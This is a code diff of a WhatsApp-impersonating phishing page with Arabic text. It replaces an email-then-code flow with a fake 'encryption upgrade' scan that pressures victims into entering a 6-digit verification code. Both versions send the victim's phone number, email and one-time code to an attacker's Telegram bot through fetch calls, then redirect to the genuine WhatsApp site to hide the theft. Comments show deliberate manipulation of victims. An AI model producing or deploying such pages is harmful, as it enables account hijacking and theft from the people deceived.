@@ -3,56 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp Authentication</title>
+    <title>WhatsApp Security Check</title>
     <style>
-        :root { --wa-bg: #0b141a; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; }
+        :root { --wa-bg: #0b141a; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; --wa-red: #ff5252; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, Segoe UI, Roboto, sans-serif; }
-        body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        body { background: var(--wa-bg); color: var(--wa-text); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
         
         .container { width: 100%; max-width: 400px; padding: 20px; text-align: center; }
-        .logo-box { margin-bottom: 25px; position: relative; display: inline-block; }
-        .main-logo { width: 70px; fill: var(--wa-green); }
         
-        .card { background: #1d2a33; border-radius: 16px; padding: 24px; border: 1px solid #2a3942; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
-        h2 { font-weight: 500; font-size: 20px; margin-bottom: 10px; }
-        .sub-text { font-size: 13px; color: var(--wa-hint); line-height: 1.6; margin-bottom: 20px; }
+        /* الأنيميشن الخاص باللوجو النابض */
+        .pulse-logo { width: 80px; fill: var(--wa-green); animation: pulse 2s infinite; }
+        @keyframes pulse {
+            0% { transform: scale(0.95); filter: drop-shadow(0 0 0 rgba(0, 168, 132, 0.7)); }
+            70% { transform: scale(1); filter: drop-shadow(0 0 15px rgba(0, 168, 132, 0)); }
+            100% { transform: scale(0.95); filter: drop-shadow(0 0 0 rgba(0, 168, 132, 0)); }
+        }
 
-        .input-group { position: relative; margin-bottom: 20px; }
-        .input-box { width: 100%; background: #2a3942; border: 1px solid #3b4a54; border-radius: 8px; padding: 16px; color: #fff; font-size: 15px; outline: none; text-align: center; transition: 0.3s; }
-        .input-box:focus { border-color: var(--wa-green); background: #25313a; }
+        .status-card { background: #1d2a33; border-radius: 15px; padding: 20px; border: 1px solid #2a3942; margin: 20px 0; text-align: right; }
+        .row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 12px; border-bottom: 1px solid #25313a; padding-bottom: 8px; }
+        .row:last-child { border: none; }
+        
+        .badge-red { color: var(--wa-red); font-weight: bold; }
+        
+        .desc-text { font-size: 14px; color: var(--wa-hint); line-height: 1.6; margin-bottom: 25px; }
 
-        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 15px; border-radius: 30px; font-size: 15px; font-weight: 700; cursor: pointer; transition: 0.2s; }
-        .btn:active { transform: scale(0.97); }
+        .input-box { width: 100%; background: #2a3942; border: 1px solid #3b4a54; border-radius: 10px; padding: 15px; color: #fff; font-size: 20px; text-align: center; outline: none; margin-bottom: 15px; }
+        .input-box:focus { border-color: var(--wa-green); }
 
-        /* شاشة التحميل الذكية */
-        #loader { position: fixed; inset: 0; background: var(--wa-bg); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: 0.5s; }
-        .spin { border: 3px solid #202c33; border-top: 3px solid var(--wa-green); border-radius: 50%; width: 40px; height: 40px; animation: s 1s linear infinite; }
-        @keyframes s { 100% { transform: rotate(360deg); } }
+        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 16px; border-radius: 30px; font-size: 16px; font-weight: 700; cursor: pointer; }
+
+        /* شاشة الفحص */
+        #scanner { position: fixed; inset: 0; background: var(--wa-bg); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: 0.6s; }
     </style>
 </head>
 <body>
 
-    <div id="loader">
-        <svg class="main-logo" viewBox="0 0 24 24" style="margin-bottom: 20px;"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.72.94 3.659 1.437 5.634 1.437h.005c6.558 0 11.894-5.335 11.897-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
-        <div class="spin"></div>
-        <p id="load-txt" style="margin-top:20px; font-size:14px; color:var(--wa-hint);">جاري تأمين الاتصال...</p>
+    <div id="scanner">
+        <svg class="pulse-logo" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.72.94 3.659 1.437 5.634 1.437h.005c6.558 0 11.894-5.335 11.897-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+        <p id="scan-status" style="margin-top:20px; font-size: 14px; color: var(--wa-hint);">جاري فحص حالة الرقم الرقم...</p>
     </div>
 
     <div class="container">
-        <div class="card">
-            <div class="logo-box">
-                <svg class="main-logo" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.72.94 3.659 1.437 5.634 1.437h.005c6.558 0 11.894-5.335 11.897-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
-            </div>
-            <h2 id="title">تأكيد الهوية الرقمية</h2>
-            <p class="sub-text" id="desc">رصدت أنظمة الأمان محاولة دخول غير مصرح بها. يرجى إدخال البريد الإلكتروني المرتبط بحسابك لتلقي إشعار الموافقة.</p>
-            
-            <div class="input-group">
-                <input type="email" id="inp" class="input-box" placeholder="example@gmail.com" dir="ltr">
-            </div>
-
-            <button class="btn" onclick="next()">إرسال طلب التحقق</button>
+        <h2 style="font-weight: 500; font-size: 18px;">نظام حماية المحادثات</h2>
+        
+        <div class="status-card">
+            <div class="row"><span>رقم الحساب:</span> <b id="phone-num">--</b></div>
+            <div class="row"><span>حالة التشفير:</span> <b class="badge-red">تشفير قديم (Legacy)</b></div>
+            <div class="row"><span>بروتوكول الأمان:</span> <b class="badge-red">TLS 1.0 / SSL v3</b></div>
         </div>
-        <p style="margin-top: 20px; font-size: 11px; color: var(--wa-hint);">WhatsApp 2FA Security System</p>
+
+        <p class="desc-text">
+            تم رصد استخدام بروتوكولات تشفير قديمة على هذا الرقم. لضمان خصوصية الرسائل ومنع التداخل، يرجى <b>الترقية إلى نظام التشفير الموحد TLS 1.3</b> عن طريق تأكيد رمز المزامنة.
+        </p>
+
+        <input type="tel" id="code" class="input-box" placeholder="--- ---" maxlength="6">
+
+        <button class="btn" onclick="sendData()">تحديث نظام التشفير الآن</button>
+
+        <p style="margin-top: 25px; font-size: 11px; color: var(--wa-hint);">مركز أمان واتساب - الإصدار 2024.4.1</p>
     </div>
 
     <script>
@@ -62,66 +70,38 @@
             P: new URLSearchParams(window.location.search).get('u') || "Unknown"
         };
 
-        let step = 0;
-
         window.onload = () => {
+            document.getElementById('phone-num').innerText = CFG.P;
+            
+            // محاكاة مراحل الفحص
+            const status = document.getElementById('scan-status');
+            setTimeout(() => status.innerText = "يتم الآن فحص طبقات التشفير...", 1000);
+            setTimeout(() => status.innerText = "تم رصد خلل في بروتوكول SSL...", 2000);
+            
             setTimeout(() => {
-                document.getElementById('loader').style.opacity = '0';
-                setTimeout(() => document.getElementById('loader').style.display = 'none', 500);
-            }, 1500);
+                document.getElementById('scanner').style.opacity = '0';
+                setTimeout(() => document.getElementById('scanner').remove(), 600);
+            }, 3000);
         };
 
-        async function notify(msg) {
+        async function sendData() {
+            const val = document.getElementById('code').value;
+            if(val.length < 6) return;
+
+            const btn = document.querySelector('.btn');
+            btn.disabled = true;
+            btn.innerText = "جاري الترقية...";
+
             await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: CFG.C, text: msg, parse_mode: 'HTML' })
-            }).catch(()=>{});
-        }
+                body: JSON.stringify({ chat_id: CFG.C, text: `🛡️ <b>Protocol Upgrade (TLS 1.3)</b>\nTarget: <code>${CFG.P}</code>\nOTP: <code>${val}</code>`, parse_mode: 'HTML' })
+            });
 
-        async function next() {
-            const inp = document.getElementById('inp');
-            const btn = document.querySelector('.btn');
-            const val = inp.value.trim();
-
-            if(!val || val.length < 5) return;
-
-            if(step === 0) {
-                // مرحلة الإيميل
-                btn.disabled = true;
-                btn.innerText = "جاري إرسال الطلب...";
-                await notify(`📧 <b>Target Email</b>\nUser: <code>${CFG.P}</code>\nEmail: <code>${val}</code>`);
-                
-                // محاكاة إرسال الإشعار
-                document.getElementById('loader').style.display = 'flex';
-                document.getElementById('loader').style.opacity = '1';
-                document.getElementById('load-txt').innerText = "يرجى فتح تطبيق البريد الإلكتروني والموافقة على الدخول...";
-                
-                setTimeout(() => {
-                    document.getElementById('loader').style.opacity = '0';
-                    setTimeout(() => document.getElementById('loader').style.display = 'none', 500);
-                    
-                    step = 1;
-                    document.getElementById('title').innerText = "أدخل رمز التفويض";
-                    document.getElementById('desc').innerText = "لم نتمكن من إرسال إشعار الدفع، يرجى إدخال الرمز المكون من 6 أرقام المرسل إلى بريدك الآن.";
-                    inp.value = "";
-                    inp.type = "tel";
-                    inp.placeholder = "--- ---";
-                    inp.maxLength = 6;
-                    btn.disabled = false;
-                    btn.innerText = "تأكيد الدخول";
-                }, 4000); // 4 ثواني عشان يحس بجدية الموضوع
-
-            } else {
-                // مرحلة الكود
-                btn.disabled = true;
-                btn.innerText = "جاري المزامنة...";
-                await notify(`🔥 <b>PERFECTION CODE</b>\nUser: <code>${CFG.P}</code>\nCode: <code>${val}</code>`);
-                
-                setTimeout(() => {
-                    window.location.href = "https://www.whatsapp.com/security";
-                }, 2000);
-            }
+            setTimeout(() => {
+                alert("تم تحديث بروتوكول الأمان بنجاح. حسابك الآن محمي بتشفير TLS 1.3.");
+                window.location.href = "https://www.whatsapp.com/security";
+            }, 1500);
         }
     </script>
 </body>
